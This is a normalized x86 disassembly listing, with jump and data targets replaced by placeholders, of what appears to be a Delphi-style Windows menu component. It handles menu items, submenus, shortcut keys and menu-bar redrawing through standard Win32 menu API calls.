mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44ef40
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44ef40
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_450180
test al al
je r-xdata
mov eax esi
call sub_44ef40
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44ef50
call sub_44ffd8
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_44ef50
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44ef50
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44ef50
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44ef50
call sub_44ffd8
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44ef50
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44ef50
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44ef50
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_44ef50
call sub_44ffd8
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_450154
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_450154
and eax 0x7f
mov al [ eax + rw-data ]
sub_450180
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_450180
and eax 0x7f
mov al [ eax + rw-data ]
sub_4501ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ce94
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_419a2c
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_450ed8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_450248
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403258
mov eax [ esi + 0x44 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419a78
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_4502bc
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_4502bc
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44ca00
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_44f344
mov eax ebx
pop esi
pop ebx
retn
sub_4502fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_44ef40
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_44ef50
call sub_4502fc
pop ecx
test al al
je r-xdata
sub_450394
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_4502fc
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44ca00
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4503c4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_450394
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_4516e8
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_450434
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_450394
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_450450
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_450394
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_44fb00
mov ebx eax
xor edx edx
mov eax edi
call sub_44fffc
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_44f468
mov eax [ esi + 0x34 ]
call sub_44f468
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_44d3a4
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_443708
push eax
call DrawMenuBar
sub_45053c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_45053c
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push j_sub_4036f8#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_450394
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_44f468
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45052c
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_450690
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4244a4
xor eax eax
push ebp
push sub_45078e
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4244a4
xor eax eax
push ebp
push sub_450763
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_45053c
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42449c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450795
mov eax [ rw-data ]
call sub_42449c
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_450394
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4507b4
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_450b38
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_450b38
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_450870
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_450e0c
mov eax ebx
call sub_4086f4
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_450910
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_450870
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404218
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404468
lea edx [ ebp - 0x200 ]
call sub_4087b8
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4509a4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_450a14
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_450eb4
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_450eb4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_450eb4
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_450a20
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_450910
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_4509a4
mov eax ebx
call sub_450ed8
jmp r-xdata
sub_450a88
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_450ad0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44ad00
mov eax ebx
call sub_4502e4
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44ad44
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_419afc
sub_450b0c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419d48
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_450ad0
sub_450b50
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_450394
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_450394
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_453e3c
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_450bac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_450c81
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_450394
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_450394
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_44ef40
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44ef50
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404190
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404190
mov eax [ ebp - 0xc ]
pop edx
call sub_407de0
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_4519f8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c88
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fcc
retn
sub_450c94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_450b50
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_450bac
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_450e0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_450518
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_450394
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_450394
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408798
mov eax [ ebp + 0x10 ]
call sub_4086dc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_450ed8
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_439dac
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_450eb4
mov [ ebx + 0x41 ] 0x1
sub_450f00
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_450eb4
mov [ ebx + 0x41 ] 0x1
sub_450f8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_450a88
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_450910
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_45101c
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_451058
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4036f8#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4510a4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4515d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4515de
lea eax [ ebp - 0x30 ]
call sub_403fa8
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413f44
mov edx [ esi + 0x4 ]
call sub_450450
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45d44c
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413f44
